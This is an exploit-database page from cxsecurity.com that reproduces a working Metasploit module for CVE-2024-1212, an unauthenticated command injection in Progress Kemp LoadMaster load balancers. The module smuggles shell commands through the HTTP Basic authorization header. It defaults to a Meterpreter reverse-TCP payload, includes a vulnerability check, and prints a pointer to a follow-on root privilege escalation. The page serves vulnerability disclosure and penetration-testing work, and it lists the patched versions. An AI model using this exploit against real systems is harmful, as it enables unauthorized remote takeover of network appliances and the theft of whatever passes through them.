---
title: Kemp LoadMaster Unauthenticated Command Injection
url: https://cxsecurity.com/issue/WLB-2024050004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-02
fetch_date: 2025-10-06T17:14:45.253810
---

# Kemp LoadMaster Unauthenticated Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Kemp LoadMaster Unauthenticated Command Injection** **2024.05.01**  Credit:  **[Dave Yesland](https://cxsecurity.com/author/Dave%2BYesland/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def flag\_file
return @flag\_file unless @flag\_file.nil?
@flag\_file = '/tmp/' + Rex::Text.rand\_text\_alpha(5)
end
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Kemp LoadMaster Unauthenticated Command Injection',
'Description' => %q{
This module exploits an unauthenticated command injection vulnerability in
Progress Kemp LoadMaster in the authorization header after vversion 7.2.48.1.
The following versions are patched: 7.2.59.2 (GA), 7.2.54.8 (LTSF) and
7.2.48.10 (LTS).
},
'Author' => [
'Dave Yesland with Rhino Security Labs',
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2024-1212'],
['URL', 'https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/'],
['URL', 'https://kemptechnologies.com/kemp-load-balancers']
],
'DisclosureDate' => '2024-03-19',
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK],
'Reliability' => [ REPEATABLE\_SESSION ]
},
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD],
'Privileged' => false,
'Targets' => [
[
'Automatic', # Add logic to run the payload only once
{
'Payload' => {
'Prepend' => "[ -f #{flag\_file} ] || ( touch #{flag\_file}; (sleep 60; rm #{flag\_file})& ",
'Append' => ')',
'BadChars' => "\x3a\x27"
}
}
],
[
'Do\_Not\_Prepend\_Runonce\_Code', # This will likely result in 2-3 sessions
{
'Payload' => {
'BadChars' => "\x3a\x27"
}
}
]
],
'Default\_target' => 0,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/linux/http/x64/meterpreter\_reverse\_tcp',
'FETCH\_WRITABLE\_DIR' => '/tmp/',
'SSL' => true,
'RPORT' => 443
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'The URI path to LoadMaster', '/'])
])
end
def exploit
uri = normalize\_uri(target\_uri.path, 'access', 'set')
vprint\_status('Sending payload...')
send\_request\_cgi({
'method' => 'GET',
'uri' => uri,
'vars\_get' =>
{
'param' => 'enableapi',
'value' => '1'
},
'authorization' => basic\_auth("';#{payload.encoded};echo '", Rex::Text.rand\_text\_alpha(rand(8..15))),
'verify' => false
})
end
def on\_new\_session(client)
super
print\_good('Now background this session with "bg" and then run "resource run\_progress\_kemp\_loadmaster\_sudo\_priv\_esc\_2024.rc" to get a root shell')
end
def check
print\_status("Checking if #{peer} is vulnerable...")
uri = normalize\_uri(target\_uri.path, 'access', 'set')
res = send\_request\_cgi({
'method' => 'GET',
'uri' => uri,
'vars\_get' => {
'param' => 'enableapi',
'value' => '1'
},
'authorization' => basic\_auth("'", Rex::Text.rand\_text\_alpha(rand(8..15))),
'verify' => false
})
# No response from server
unless res
return CheckCode::Unknown
end
# Check for specific error pattern in headers or body to confirm vulnerability
if res.headers.to\_s.include?('unexpected EOF while looking for matching') || res.body.include?('unexpected EOF while looking for matching')
return CheckCode::Vulnerable
else
return CheckCode::Safe
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top